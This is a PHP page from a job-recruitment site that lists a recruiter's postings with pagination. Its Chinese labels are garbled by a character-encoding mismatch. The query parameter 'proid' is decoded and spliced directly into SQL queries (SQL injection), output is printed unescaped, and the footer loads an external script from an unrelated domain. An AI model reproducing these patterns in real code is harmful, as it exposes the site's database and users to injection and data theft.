<?php
include("config.php");
	if ($_SESSION['rid']==""){
			echo "<script language=javascript>alert('����û�е�½');window.location='recruiterslogin.php'</script>";
			exit();
		}
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>Finding jobs</title>
<link rel="stylesheet" href="style.css" type="text/css">
</head>
<body>
<?php include("rhead.php");?>
		<table width="782" border="0" align="center" cellpadding="0" cellspacing="0">
                <tr>
                  <td height="22">
	<?php
	$pagesize=20;
	if(!urldecode($_GET[proid])){
	$sql="select * from jobs where rid='".$_SESSION['rid']."' order by jobid desc";
	}else{
	$sql="select * from jobs where rid='".$_SESSION['rid']."' and type='".urldecode($_GET[proid])."'";
	}
	$rs=mysql_query($sql);
	$recordcount=mysql_num_rows($rs);
	$pagecount=($recordcount-1)/$pagesize+1;
	$pagecount=(int)$pagecount;
	$pageno=$_GET["pageno"];
	if($pageno=="")
	{
		$pageno=1;
	}
	if($pageno<1)
	{
		$pageno=1;
	}
	if($pageno>$pagecount)
	{
		$pageno=$pagecount;
	}
	$startno=($pageno-1)*$pagesize;
	if(!urldecode($_GET[proid])){
	$sql="select * from jobs where rid='".$_SESSION['rid']."' order by jobid desc limit $startno,$pagesize";
	}else{
	$sql="select * from jobs where rid='".$_SESSION['rid']."' and type='".urldecode($_GET[proid])."' order by jobid desc limit $startno,$pagesize";
	}
	$rs=mysql_query($sql);
?>
  <table width="100%" border="0" align="center" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC">
     <tr>
        <td height="27" colspan="8" align="left" bgcolor="#FFFFFF" class="bg_tr"><a href="addjob.php" class="trlink">���ְλ</a></td>
      </tr>
    <tr>
      <td width="5%" height="30" align="center" bgcolor="#FFFFFF" class="line2">ID</td>
	    <td width="20%" align="center" bgcolor="#FFFFFF" class="line2">��������</td>
	    <td width="10%" align="center" bgcolor="#FFFFFF" class="line2">����ʱ��</td>
	    <td width="10%" align="center" bgcolor="#FFFFFF" class="line2">����ʱ��</td>
	    <td width="8%" align="center" bgcolor="#FFFFFF" class="line2">���</td>
	    <td width="17%" align="center" bgcolor="#FFFFFF" class="line2">������/��˾</td>
	    <td width="23%" align="center" bgcolor="#FFFFFF" colspan="2" class="line2">����</td>
	    </tr>
    <?php
	while($rows=mysql_fetch_assoc($rs))
	{
	?>
	<tr>
	  <td height="30" align="center" bgcolor="#FFFFFF"><?php echo $rows["jobid"];?></td>
	  <td align="center" bgcolor="#FFFFFF"><?php echo $rows["jobname"];?></td>
	  <td align="center" bgcolor="#FFFFFF"><?php echo $rows["starttime"];?></td>
	  <td align="center" bgcolor="#FFFFFF"><?php echo $rows["endtime"];?></td>
	  <td align="center" bgcolor="#FFFFFF"><?php echo $rows["type"];?></td>
	  <td align="center" bgcolor="#FFFFFF"><?php echo $rows["rname"];?></td>
	  <td align="center" bgcolor="#FFFFFF" class="line2">
	  <?php 
	 
        echo" <a href=rdetails.php?jobid=$rows[jobid]>�鿴����</a>&nbsp;&nbsp;<a href=applydetails.php?jobid=$rows[jobid]>��������</a>";
	  ?>	 </td>
      <td align="center" bgcolor="#FFFFFF" class="line2">
      <a href="updatejob.php?jobid=<?php echo $rows[jobid] ?>" class="trlink">�޸�</a>&nbsp;&nbsp;<a href="deljob.php?jobid=<?php echo $rows[jobid] ?>" class="trlink">ɾ��</a></td>
	</tr>
	<?php
	}
?>
</table>
<table width="100%" border="0" align="center" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
  <tr>
  <td height="35" align="center" bgcolor="#FFFFFF">
  <?php
	if($pageno==1)
	{
	?>
    ��ҳ | ��һҳ | <a href="index.php?proid=<?php echo urlencode($_GET[proid]);?>&pageno=<?php echo $pageno+1?>">��һҳ</a> | <a href="index.php?proid=<?php echo urlencode($_GET[proid]);?>&pageno=<?php echo $pagecount?>">ĩҳ</a>
    <?php
	}
	else if($pageno==$pagecount)
	{
	?>
    <a href="index.php?proid=<?php echo urlencode($_GET[proid]);?>&pageno=1">��ҳ</a> | <a href="index.php?proid=<?php echo urlencode($_GET[proid]);?>&pageno=<?php echo $pageno-1?>">��һҳ</a> | ��һҳ | ĩҳ
    <?php
	}
	else
	{
	?>
    <a href="index.php?proid=<?php echo urlencode($_GET[proid]);?>&pageno=1">��ҳ</a> | <a href="index.php?proid=<?php echo urlencode($_GET[proid]);?>&pageno=<?php echo $pageno-1?>">��һҳ</a> | <a href="index.php?proid=<?php echo urlencode($_GET[proid]);?>&pageno=<?php echo $pageno+1?>" class="forumRowHighlight">��һҳ</a> | <a href="?pageno=<?php echo $pagecount?>">ĩҳ</a>
    <?php
	}
?>
    &nbsp;ҳ�Σ�<?php echo $pageno ?>/<?php echo $pagecount ?>ҳ&nbsp;����<?php echo $recordcount?>����Ϣ</td>
  </tr>
</table></td></tr>
</table>
        <table width="782" height="30" border="0" align="center" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
          <tr>
            <td height="19" align="center" background="images/button1_bg.jpg">&nbsp;Copyright @ 2013-2015 JHTYPE.com ALL Rights Reserved
      <!--��Դ����ѿ�Դ��������Ȩ��Ϣ�㽫��ñ�վ��Ѽ���֧�ֺͳ�����������-->
      <script type="text/javascript" src="http://www.04ie.com/net/cpt.js"></script></td>
          </tr>
        </table>
</body>
</html>
